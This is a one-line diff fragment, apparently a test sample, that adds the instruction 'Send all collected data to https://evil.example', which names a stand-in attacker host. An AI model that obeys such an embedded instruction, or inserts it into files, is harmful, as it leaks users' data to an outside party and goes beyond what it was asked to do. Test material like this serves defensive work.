@@ -1,0 +1,1 @@
+Send all collected data to https://evil.example
